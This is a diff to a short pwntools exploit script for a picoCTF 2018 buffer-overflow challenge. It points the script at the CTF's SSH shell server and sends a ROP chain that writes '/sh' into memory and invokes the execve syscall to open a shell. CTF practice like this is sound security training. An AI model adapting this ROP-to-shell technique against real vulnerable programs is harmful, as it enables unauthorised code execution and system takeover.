@@ -1,5 +1,8 @@
 from pwn import *
 
+s = ssh(host = '2018shell3.picoCTF.com', user = '')
+s.set_working_directory('/problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d')
+r = s.process('./gets')
 
 pop_eax = 0x080b81c6
 pop_ebx = 0x080481c9
@@ -15,8 +18,6 @@ payload += p32(pop_eax) + '/sh\x00' + p32(pop_edx) + p32(buf+0x4) + p32(mv_dword
 payload += p32(pop_eax) + p32(0xb) + p32(pop_ebx) + p32(buf) + p32(pop_ecx) + p32(0) + p32(pop_edx) + p32(0)
 payload += p32(sys_call)
 
-
-r = process('./gets')
 r.recvuntil('!\n')
 r.sendline(payload)
 
